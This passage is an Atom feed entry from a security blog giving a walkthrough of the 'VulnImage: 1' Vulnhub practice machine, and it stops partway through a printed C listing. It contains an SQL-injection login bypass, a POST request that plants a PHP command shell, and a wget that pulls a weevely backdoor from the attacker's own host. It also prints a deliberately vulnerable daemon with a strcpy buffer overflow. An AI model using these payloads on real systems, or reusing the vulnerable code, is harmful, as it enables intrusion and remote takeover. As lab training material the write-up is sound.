<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Vulnhub | 0x41414141]]></title>
  <link href="http://73696e65.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
  <link href="http://73696e65.github.io/"/>
  <updated>2015-05-10T17:09:14+02:00</updated>
  <id>http://73696e65.github.io/</id>
  <author>
    <name><![CDATA[Norbert Szetei]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[VulnImage: 1]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/10/vulnimage-1/"/>
    <updated>2015-05-10T15:18:05+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/10/vulnimage-1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/vulnimage-1,39/">VulnImage: 1</a></p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE     VERSION
</span><span class='line'>22/tcp   open  ssh         OpenSSH 5.1p1 Debian 5 (protocol 2.0)
</span><span class='line'>25/tcp   open  smtp        Exim smtpd 4.50
</span><span class='line'>80/tcp   open  http        Apache httpd 2.2.9 ((Debian) PHP/5.2.6-1+lenny9 with Suhosin-Patch)
</span><span class='line'>139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>3306/tcp open  mysql       MySQL 5.0.51a-24+lenny4
</span><span class='line'>7777/tcp open  cbt?</span></code></pre></td></tr></table></div></figure></p>

<p>With dirb we found a few interesting directories (repo, admin, profiles),
directory listing is enabled:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&mdash;- Scanning URL: &lt;a href="http://192.168.80.143/">http://192.168.80.143/&lt;/a> &mdash;-
</span><span class='line'>+ &lt;a href="http://192.168.80.143/index">http://192.168.80.143/index&lt;/a> (CODE:200|SIZE:71)  &lt;br/>
</span><span class='line'>+ &lt;a href="http://192.168.80.143/view">http://192.168.80.143/view&lt;/a> (CODE:200|SIZE:166)  &lt;br/>
</span><span class='line'>==> DIRECTORY: &lt;a href="http://192.168.80.143/admin/">http://192.168.80.143/admin/&lt;/a>  &lt;br/>
</span><span class='line'>==> DIRECTORY: &lt;a href="http://192.168.80.143/profiles/">http://192.168.80.143/profiles/&lt;/a>  &lt;br/>
</span><span class='line'>==> DIRECTORY: &lt;a href="http://192.168.80.143/repo/">http://192.168.80.143/repo/&lt;/a>  &lt;br/>
</span><span class='line'>+ &lt;a href="http://192.168.80.143/myblog">http://192.168.80.143/myblog&lt;/a> (CODE:200|SIZE:736)  &lt;br/>
</span><span class='line'>+ &lt;a href="http://192.168.80.143/server-status">http://192.168.80.143/server-status&lt;/a> (CODE:403|SIZE:332)  &lt;br/></span></code></pre></td></tr></table></div></figure></p>

<p>Submitting the quote gives an error SQL message:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.143/admin/profile.php">http://192.168.80.143/admin/profile.php&lt;/a>
</span><span class='line'>Username: &lsquo;
</span><span class='line'>Password a&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&hellip;
</span><span class='line'>SELECT * FROM blog_users WHERE poster = &lsquo;&rsquo;&lsquo; AND password = 'a&rsquo;</span></code></pre></td></tr></table></div></figure></p>

<p>After a few minutes of playing with requests we realize that we can create
files in format &lsquo;username-fname&rsquo; and with the content of &lsquo;sig&rsquo; parameter.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /admin/profile.php HTTP/1.1
</span><span class='line'>Host: 192.168.80.143
</span><span class='line'>User-Agent: Mozilla/5.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&lt;em>/&lt;/em>;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>DNT: 1
</span><span class='line'>Referer: &lt;a href="http://192.168.80.143/admin/profile.php">http://192.168.80.143/admin/profile.php&lt;/a>
</span><span class='line'>Connection: keep-alive
</span><span class='line'>Cache-Control: max-age=0
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Content-Length: 104&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>username=testa&amp;password=test' or &lsquo;2&rsquo;=&lsquo;2&amp;sig=&lt;?php system($_REQUEST['cmd&rsquo;]); ?>&amp;fname=x.php&amp;submit=Submit</span></code></pre></td></tr></table></div></figure></p>

<p>Now we have a simple PHP shell:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.143/profiles/testa-x.php?cmd=id">http://192.168.80.143/profiles/testa-x.php?cmd=id&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure></p>

<p>We download the weevely.php from our server and connect:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.143/profiles/testa-x.php?cmd=wget">http://192.168.80.143/profiles/testa-x.php?cmd=wget&lt;/a> 192.168.80.137/weevely.php.txt -O c.php
</span><span class='line'>root@kali32:~# weevely &lt;a href="http://192.168.80.143/profiles/c.php">http://192.168.80.143/profiles/c.php&lt;/a> 1234</span></code></pre></td></tr></table></div></figure></p>

<p>In the repo directory, we examine the buffd.c. It is a vulnerable daemon,
listening on port 7777.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="nl">debian</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span> <span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">repo</span><span class="o">/</span><span class="n">buffd</span><span class="p">.</span><span class="n">c</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">errno</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">socket</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">netinet</span><span class="o">/</span><span class="n">in</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">netdb</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">arpa</span><span class="o">/</span><span class="n">inet</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">wait</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">signal</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">PORT</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">7777</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="c1">// the port users will be connecting to&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">BACKLOG</span> <span class="mi">10</span>       <span class="c1">// how many pending connections queue will hold&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">vulnerable</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">net_buffer</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="kt">char</span> <span class="n">local_buffer</span><span class="p">[</span><span class="mi">120</span><span class="p">];</span>
</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">local_buffer</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">);</span>
</span><span class='line'><span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">sigchld_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">WNOHANG</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// get sockaddr, IPv4 or IPv6:</span>
</span><span class='line'><span class="kt">void</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">get_in_addr</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">sa</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">sa</span><span class="o">-&gt;</span><span class="n">sa_family</span> <span class="o">==</span> <span class="n">AF_INET</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="k">return</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;(((</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="o">*</span><span class="p">)</span><span class="n">sa</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">sin_addr</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">return</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;(((</span><span class="k">struct</span> <span class="n">sockaddr_in6</span><span class="o">*</span><span class="p">)</span><span class="n">sa</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">sin6_addr</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">new_fd</span><span class="p">;</span> <span class="c1">// listen on sock_fd, new connection on new_fd</span>
</span><span class='line'><span class="k">struct</span> <span class="n">addrinfo</span> <span class="n">hints</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">servinfo</span><span class="p">,</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">p</span><span class="p">;</span>
</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr_storage</span> <span class="n">their_addr</span><span class="p">;</span> <span class="c1">// connector&amp;rsquo;s address information</span>
</span><span class='line'><span class="kt">socklen_t</span> <span class="n">sin_size</span><span class="p">;</span>
</span><span class='line'><span class="k">struct</span> <span class="n">sigaction</span> <span class="n">sa</span><span class="p">;</span>
</span><span class='line'><span class="kt">int</span> <span class="n">yes</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="n">in_buffer</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="n">out_buffer</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="n">net_buffer</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
</span><span class='line'><span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="n">INET6_ADDRSTRLEN</span><span class="p">];</span>
</span><span class='line'><span class="kt">int</span> <span class="n">rv</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">hints</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">hints</span><span class="p">);</span>
</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_family</span> <span class="o">=</span> <span class="n">AF_UNSPEC</span><span class="p">;</span>
</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_socktype</span> <span class="o">=</span> <span class="n">SOCK_STREAM</span><span class="p">;</span>
</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_flags</span> <span class="o">=</span> <span class="n">AI_PASSIVE</span><span class="p">;</span> <span class="c1">// use my IP&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">((</span><span class="n">rv</span> <span class="o">=</span> <span class="n">getaddrinfo</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">hints</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">servinfo</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">getaddrinfo</span><span class="p">:</span> <span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">gai_strerror</span><span class="p">(</span><span class="n">rv</span><span class="p">));</span>
</span><span class='line'><span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// loop through all the results and bind to the first we can</span>
</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">servinfo</span><span class="p">;</span> <span class="n">p</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_next</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="k">if</span> <span class="p">((</span><span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_family</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_socktype</span><span class="p">,</span>
</span><span class='line'><span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_protocol</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">server</span><span class="p">:</span> <span class="n">socket</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="k">continue</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">yes</span><span class="p">,</span>
</span><span class='line'><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">setsockopt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addr</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addrlen</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">server</span><span class="p">:</span> <span class="n">bind</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="k">continue</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">server</span><span class="p">:</span> <span class="n">failed</span> <span class="n">to</span> <span class="n">bind</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">freeaddrinfo</span><span class="p">(</span><span class="n">servinfo</span><span class="p">);</span> <span class="c1">// all done with this structure&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">BACKLOG</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">listen</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">sa</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">sigchld_handler</span><span class="p">;</span> <span class="c1">// reap all dead processes</span>
</span><span class='line'><span class="n">sigemptyset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">sa</span><span class="p">.</span><span class="n">sa_mask</span><span class="p">);</span>
</span><span class='line'><span class="n">sa</span><span class="p">.</span><span class="n">sa_flags</span> <span class="o">=</span> <span class="n">SA_RESTART</span><span class="p">;</span>
